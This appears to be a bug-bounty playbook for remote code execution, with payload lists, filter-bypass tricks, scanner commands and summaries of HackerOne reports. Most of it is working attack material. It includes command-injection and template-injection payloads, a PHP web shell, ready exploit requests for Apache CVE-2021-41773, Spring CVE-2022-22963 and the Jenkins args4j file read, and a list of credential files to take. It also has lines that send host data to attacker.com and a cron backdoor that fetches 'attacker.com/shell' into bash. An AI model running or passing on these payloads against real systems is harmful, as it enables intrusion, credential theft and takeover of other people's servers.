
%0aid

%0d%0aid

';id;'

";id;"

|whoami

;cat /etc/passwd

$(cat /etc/passwd)

`cat /etc/passwd`

```



### Space / filter bypass



```text

cat${IFS}/etc/passwd

cat$IFS/etc/passwd

cat</etc/passwd

c\at /etc/passwd

c'a't /etc/passwd

/bin/cat$IFS/etc/passwd

$(printf '\x69\x64')

echo${IFS}aWQ=|base64${IFS}-d|sh

id%09

id%0a

;id;#

|id|

```



### Argument injection



```text

--output=/tmp/x

-o /tmp/x

--config=/tmp/x

--upload-pack=id

--checkpoint-action=exec=id

-fsSL http://callback/x

--proxy=http://callback:8080

--dump-config

@file

file:///etc/passwd

```



### Expression / template / log4j



```text

${7*7}

{{7*7}}

#{7*7}

<%= 7*7 %>

${jndi:ldap://callback/a}

${jndi:dns://callback/a}

${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}

{{cycler.__init__.__globals__.os.popen('id').read()}}

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

<%= system('id') %>

```



### Upload / parser / archive



```text

push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://callback/x)'\npop graphic-context

<?php system($_GET['c']); ?>

<svg onload=alert(1)>

../../../../var/www/html/shell.php

..\..\..\..\inetpub\wwwroot\shell.aspx

PK../../../../var/www/html/shell.php

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` (53)

- `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` (12 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 7× | `$where` |

| 5× | `SFORMAT()` |

| 4× | `https://twitter.com/{username}/moments` |

| 4× | `<img>` |

| 4× | `..;/` |

| 4× | `requestOCSP()` |

| 4× | `loadSession()` |

| 4× | `VM.doCODESIZE()` |

| 4× | `discover()` |

| 4× | `%00` |

| 3× | `eval()` |

| 3× | `OsCommand.writeJson()` |

| 3× | `$templates` |

| 3× | `<local_file_path>` |

| 3× | `<webview>` |

| 3× | `loadSNI()` |

| 3× | `<div>` |

| 3× | `$GITHUB_TOKEN` |

| 3× | `install_packages()` |

| 3× | `=cmd\\|' /C calc'!A0` |



## Parameters observed



`for[]` · `id` · `name` · `for` · `iclLayout` · `url` · `debug` · `action` · `email` · `status` · `new_size[]` · `scope` · `dag_id` · `username` · `password` · `search` · `ref` · `client_id` · `redirect_uri` · `response_type`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_rce.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_rce.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` | 53 |

| `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` | 12 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_rce.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_rce.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_rce.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Use OAST for blind command injection; check argument injection in tools that shell out.



```sh

nuclei -u https://target -tags rce,cmdi,oast \

       -severity low,medium,high,critical -rl 40 -o nuclei_rce.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/cmdi -dast \

       -rl 40 -o nuclei_rce_cmdi.txt

nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/header-command-injection.yaml \

       -rl 40 -o nuclei_rce_header-command-injection.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Template Injection Probes

```

# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity

{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}

{{'7'*7}}

{{config}}

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}



# Nomad template injection (Go text/template)

{{ env "NOMAD_SECRET_ID" }}

{{ with secret "secret/data/prod" }}{{ .Data.password }}{{ end }}

{{ runscript "id" }}

```



### Apache HTTP Server alias path traversal (CVE-2021-41773 / CVE-2021-42013)



Path normalization bug in Apache 2.4.49 (and the 2.4.50 patch-bypass) lets an attacker escape DocumentRoot via dot-encoded segments **through configured alias paths**. The same primitive yields very different impact depending on which alias accepts the traversal:



- Alias without `Options +ExecCGI` (e.g. `/icons/`) → arbitrary file read only

- Alias with `Options +ExecCGI` (e.g. `/cgi-bin/`) → arbitrary code execution



**Version fingerprint:**

```bash

curl -sI http://target/ | grep -i "Server:"

# Vulnerable: Apache/2.4.49 (CVE-2021-41773) or Apache/2.4.50 (CVE-2021-42013)

# Patched:    Apache/2.4.51+

```



**File-read test (any alias):**

```bash

curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# Note: --path-as-is is REQUIRED — curl normalizes %2e by default

```



**RCE test (cgi-enabled alias only):**

```bash

curl --path-as-is -X POST \

  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname" \

  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

```



**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.



### Spring Cloud Function SpEL injection (CVE-2022-22963)



Spring Cloud Function ≤ 3.2.2 (and ≤ 3.1.6) evaluates the `spring.cloud.function.routing-expression` header as a SpEL expression on the `/functionRouter` endpoint without auth, before any routing logic. Wide deployment in AWS Lambda + Cloud Run + on-prem function platforms. Often exposed externally because `/functionRouter` auto-registers and devs don't add an explicit gate.



**Detection:**

- Spring-style port 8080 with `/uppercase`, `/lowercase`, or arbitrary single-word function endpoints responding 200

- Confirm with `curl -s http://target:8080/uppercase -H "Content-Type: text/plain" --data-binary "test"` → returns `TEST`

- Version banner via `/actuator/info` or response headers



**Exploit:**

```bash

curl -X POST http://target:8080/functionRouter \

  -H "Content-Type: text/plain" \

  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \

  --data "x"

```



The `new String[]{"...", "..."}` array form avoids shell-quoting issues that break the more common `.exec("id")` form when the SpEL header contains parentheses or quotes.



**Generalizes to:** any Spring application that takes user input into a `SpelExpressionParser.parseExpression()` call, especially when delivered via header / query-param routes that bypass normal auth filters. See `ssti` for the broader SpEL fingerprinting (`*{7*7}` = Spring Thymeleaf).



### SnakeYAML RCE Gadget

```yaml

!!javax.script.ScriptEngineManager [

  !!java.net.URLClassLoader [[

    !!java.net.URL ["http://attacker.com/exploit.jar"]

  ]]

]

```



### Ruby YAML / rdoc_options RCE

```yaml

--- !ruby/object:Gem::Installer

i: x

```



### Dependency Confusion Detection

```bash

# Find internal package names

grep -r '"name"' node_modules/ | grep '@internal\|@company\|@private'

# Check if public registry has higher version

npm view @target-company/internal-package version 2>/dev/null

```



### Ingress-nginx Path Injection

```

# In spec.rules.http.paths.path

/something)(;.*);#

# Results in nginx config injection

```



### Kubernetes Exposed API Check

```bash

curl -sk https://TARGET:6443/api/v1/namespaces/default/pods \

  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

kubectl --insecure-skip-tls-verify -s https://TARGET:6443 get pods --all-namespaces

```



### Out-of-Band RCE Confirmation

```bash

# Payload to confirm blind RCE via DNS

curl "http://$(id | base64).YOUR-INTERACTSH-URL/"

nslookup $(whoami).attacker.com

wget http://attacker.com/$(cat /etc/hostname)

```



### ActiveStorage Path Traversal → RCE

```

# Filename in upload request

filename="../../../../etc/cron.d/backdoor"

# Cron payload content

* * * * * root curl http://attacker.com/shell | bash

```



### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)



Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Unauthenticated when "anonymous read access" is on (Jenkins default for fresh installs).



**Detection:**

- Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)

- Or: any Java app whose CLI source uses args4j without `expandAtFiles=false`



**Test (Jenkins):**

```bash

# Get the legit CLI jar from the target

curl -sLO http://target:8080/jnlpJars/jenkins-cli.jar



# First line of file leaks via 'help' error

java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/etc/passwd

# → ERROR: Too many arguments: root:x:0:0:root:/root:/bin/bash



# Full file leaks via 'connect-node' (every line returned as a "no such agent" error)

java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd

# → All passwd lines echoed back



# Recon: env vars + JENKINS_HOME path

java -jar jenkins-cli.jar -s http://target:8080/ -http help 1 @/proc/self/environ

```



**Crown-jewel files after JENKINS_HOME confirmed:**

- `/var/jenkins_home/secret.key` — master encryption key for stored credentials

- `/var/jenkins_home/secrets/master.key` — derives the encryption key

- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)

- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)

- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens



**Pattern generalizes beyond Jenkins.** Any Java service that:

1. Embeds args4j (most enterprise Java CLIs since 2010s)

2. Exposes the CLI handler over HTTP (Jenkins, Hudson forks, custom internal tools)

3. Returns argument-parsing errors verbatim to the client



→ same arbitrary-read primitive applies. Validation via `triage-validation` Reproducibility Gate: confirm the leak on at least 2 distinct commands (e.g., `help` and `connect-node`) and verify the file content actually appears in the response, not just a generic 500.



### Grep Patterns for Source Review

```bash

# Command injection sinks

grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .

grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .



# Template engine instantiation

grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .



# Unsafe YAML load

grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument

grep -rn "Yaml()\|new Yaml()" --include="*.java" .

```



---

### Companion: hunting / references/techniques.md

# RCE — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.

- Use time-based and OOB callbacks, not just output reflection.

- Test argument injection on tools that take filenames/URLs (curl, ffmpeg, git, ImageMagick).

- Check upload -> processing chains (SVG, image, office, archive).

- Look at admin/debug endpoints and internal tooling exposed to users.



## Bypass tricks



- Blind via DNS/HTTP callback; encode spaces as `${IFS}`, `%09`, `$()`.

- Bypass blocklists with base64, wildcards, quotes, and environment variables.

- Use file-write + include, or log poisoning, when direct exec is blocked.



## Deeper checklist



- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.

- Test command injection with time-based and OOB callbacks, not just output reflection.

- Try argument injection on tools that accept filenames/URLs (curl, ffmpeg, git, imagemagick).

- Check file upload + processing chains (SVG, image, office, archive) for code paths.

- Test expression languages, spreadsheet formulas, and template engines.

- Look at admin/debug endpoints and internal tooling exposed to users.

- Escalate from injection to a clear impact: command output, file read, or callback.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Potential pre-auth RCE on Twitter VPN** — `#591295` · X / xAI · $20,160 · ▲1246

  > For security concern, we didn't attach the `mtmp/system` and the `dataa/data.mdb`.

- **Exposed Kubernetes API - RCE/Exposed Creds** — `#455645` · Snapchat · $25,000 · ▲1191

  > During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.

- **RCE via npm misconfig -- installing internal libraries from the public registry** — `#925585` · PayPal · $30,000 · ▲946

  > [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)

- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851

  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.

- **H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products** — `#422944` · Shopify · $0 · ▲830

  > When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`:

- **Remote Code Execution on www.semrush.com/my_reports on Logo upload** — `#403417` · Semrush · $0 · ▲824

  > Tavis Ormandy has also mentioned recently that the policy.xml needs to disable EPS,PS,PDF and XPS since all these have ways to trigger Ghostscript: http://openwall.com/lists/oss-security/2018/08/21/2

- **Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application** — `#873614` · PlayStation · $15,000 · ▲780

  > After opening the initial URL at `https://psnow.playstation.com/app/1.10.43/105/00d3603f8/` we can see the `Connection: Upgrade` request to this server from `psnow.playstation.com`.

- **Git flag injection - local file overwrite to remote code execution** — `#658013` · GitLab · $12,000 · ▲777

  > The `wiki blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional flags to be injected into the git command.

- **Webshell via File Upload on ecjobs.starbucks.com.cn** — `#506646` · Starbucks · $0 · ▲688

  > I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

- **RCE and Complete Server Takeover of http://www.█████.starbucks.com.sg/** — `#502758` · Starbucks · $0 · ▲572

  > One twist was that since I needed to bypass the local proxy, instead of attacking `/web-console`, I had to send all requests to `/josso/%5C../web-console`.

- **Privilege Escalation From user to SYSTEM via unauthenticated command execution** — `#544928` · Ubiquiti Inc. · $0 · ▲553

  > Since the evostream service is running as SYSTEM a user can use the launchprocess command, http://docs.evostream.com/2.0/launchProcess.html, to execute any binary with supplied arguments.

- **BAD Code !** — `#180074` · Paragon Initiative Enterprises · $0 · ▲549

  > Anyway, I've found that your code here https://github.com/paragonie/airship/blob/master/tools/audit helper.php , is starting with <?php and it should be with ? ...

- **Local files could be overwritten in GitLab, leading to remote command execution** — `#587854` · GitLab · $12,000 · ▲542

  > Suppose we have a repository which has only one file `id ed25519.pub` (contains my pubkey) in directory `--output=/var/opt/gitlab/.ssh/authorized keys/`.

- **Remote Code Execution in Slack desktop apps + bonus** — `#783877` · Slack · $0 · ▲509

  > banned `iframe`, `applet`, `meta`, `script`, `form` etc.

- **RCE when removing metadata with ExifTool** — `#1154542` · GitLab · $20,000 · ▲508

  > When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go L104) through to [ExifTool](https://exiftool.org/) to remove any…

- **profile-picture name parameter with large value lead to DoS for other users and programs on the platform** — `#764434` · HackerOne · $0 · ▲475

  > Add the payload text (attached with report payload.txt) at the starting of the filename in the above request e.g `<payload abcd.png`

- **RCE via unsafe inline Kramdown options when rendering certain Wiki pages** — `#1125425` · GitLab · $20,000 · ▲427

  > As both `require relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.

- **Panorama UI XSS leads to Remote Code Execution via Kick/Disconnect Message** — `#631956` · Valve · $0 · ▲420

  > So we tried a simple payload `disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg' "`, and after running it twice (for caching purposes), the cat appeared to our surprise.

- **Remote code execution on Basecamp.com** — `#365271` · Basecamp · $5,000 · ▲417

  > /Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).

- **H1514 Server Side Template Injection in Return Magic email templates?** — `#423541` · Shopify · $0 · ▲409

  > `{{ this. proto .constructor.name }}` -- `Object`

- **Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** — `#591302` · Automattic · $0 · ▲405

  > The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary `Origin` header in the request, which is then echoed back in the response via the…

- **Remote Command Execution via Github import** — `#1679624` · GitLab · $33,510 · ▲392

  > run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: gitlab session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen payload3.rb`

- **RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)** — `#1609965` · GitLab · $33,510 · ▲387

  > Most of the places I've checked do not allow you to set the `import source` for a project, or have the `import type` set to something other than `gitlab project` or `gitlab custom project template` (which is required to use the…

- **RCE on build server via misconfigured pip install** — `#946409` · Yelp · $0 · ▲366

  > Whenever `yelp-cgeom` is installed, my `setup.py` script is executed on the machine where it is downloaded.

- **Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)** — `#3782701` · Mozilla · $12,000 · ▲361

  > The anonymous role has the required scopes. On `firefox-ci-tc` the `anonymous` role grants `auth:expand-scopes`, `auth:list-roles`, `auth:current-scopes`, and `hooks:list-hooks: `.

- **Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload** — `#487008` · Flickr · $0 · ▲340

  > 3.Now go to https://www.flickr.com/cameraroll and you should be able to see contents of /etc/passwd.

- **[Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable** — `#210779` · X / xAI · $0 · ▲323

  > According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token

- **Code injection possible with malformed Nextcloud Talk chat commands** — `#851807` · Nextcloud · $0 · ▲317

  > For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/ create-pathtocalcsh) can show the output because it has…

- **RCE on TikTok Ads Portal** — `#1024575` · TikTok · $0 · ▲312

  > The video upload endpoint on the TikTok Ads portal was potentially susceptible to remote code execution (RCE) due to a ffmpeg misconfiguration.

- **RCE via github import** — `#1672388` · GitLab · $0 · ▲271

  > - Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR IP YOUR PORT` in which, you should replace `IP` and `PORT` with the one you have.



## Case studies



### Potential pre-auth RCE on Twitter VPN

`#591295` · X / xAI · $20,160 · critical · 2019-08-10 · ▲1246

> Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE. Recently, we are doing a research about SSL VPN security, and found several critical vulnerabilities on Pulse Secure SSL VPN! We have reported to vendor and patches have been released on 2019/4/25.



### Exposed Kubernetes API - RCE/Exposed Creds

`#455645` · Snapchat · $25,000 · critical · 2021-07-29 · ▲1191

> @txt3rob found one of Snaps internal Kubernetes instances exposing an API endpoint without authorization to the public. With access to this API he was able to run arbitrary code/jobs as a cluster-admin and gained access to credentials with internal access to a significant number of instances. During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.



### RCE via npm misconfig -- installing internal libraries from the public registry

`#925585` · PayPal · $30,000 · critical · 2021-02-09 · ▲946

> A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. Since the packages on the public registry did not exist, the researcher created these and observed they were downloaded. Had these packages been registered with malicious intent, it is possible for internal development to have included this code.



### DoS on PayPal via web cache poisoning

`#622122` · PayPal · $9,700 · medium · 2019-10-23 · ▲851

> On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'. This was patched and awarded a $9,700 bounty. By the time you read this, there should be a full writeup on this technique at https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning



### H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products

`#422944` · Shopify · $0 · medium · 2020-02-06 · ▲830

> kitcrm.com allows the administrator to upload priority product images located at: https://kitcrm.com/seller/onboarding/1 {F359446} {F359447} These images are not being checked if they are real JPG/PNG/GIF. When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on ██████████:8080: Then connecting kitcrm to Facebook Messenger, and writing the following commands to kit: {F359445} {F359443} {F359444} A…



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class rce --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class rce

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class rce

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class rce --min-bounty 1000

```



## Bypass Techniques



### Bypass: Shell metacharacter filtering

```bash

# Blocked: ; | & ` $()

# Bypass using $IFS and encodings

cat${IFS}/etc/passwd

{cat,/etc/passwd}

$'\x63\x61\x74' /etc/passwd  # hex encoding

$(printf '\x63\x61\x74') /etc/passwd



# Newline injection when semicolons blocked

payload=$'\ncurl attacker.com\n'

```



### Bypass: URL scheme allowlist (javascript: blocked)

```

# Mobile apps often block javascript: but miss:

jAvAsCrIpT:alert(1)          # case variation

javascript&#58;alert(1)      # HTML entity

javascript:void(alert(1))    # void wrapper

intent://attacker.com#Intent;scheme=javascript;...

data:text/html,<script>alert(1)</script>

```



### Bypass: YAML safe_load / type restrictions

```yaml

# If !!java.* is blocked, try legitimate classes with side effects

!!com.sun.rowset.JdbcRowSetImpl

  dataSourceName: 'ldap://attacker.com/a'

  autoCommit: true

# Or find allowlisted types with dangerous constructors

```



### Bypass: npm scope restrictions

```

# If @company/* is monitored, look for unscoped internal names

# e.g., "internal-utils" instead of "@company/internal-utils"

# Public registries serve unscoped packages first

```



### Bypass: Path traversal filters

```

# Basic filter bypass

../           → ..%2F → %2e%2e%2f → ....// 

# Double encoding

%252e%252e%252f

# Unicode normalization

..%c0%af  (overlong UTF-8)

# Null byte (older systems)

../../etc/passwd%00.jpg

```



### Bypass: Template injection with output filtering

```

# If {{ }} is sanitized on output but not evaluation:

{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}

# Blind — use DNS callback instead of output

{{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}

```



### Bypass: WAF blocking `exec`, `system`, `popen`

```ruby

# Ruby

send(:system, "id")

method(:exec).call("id")

Kernel.send(:`, "id")

Object.const_get(:Kernel).system("id")

```



---
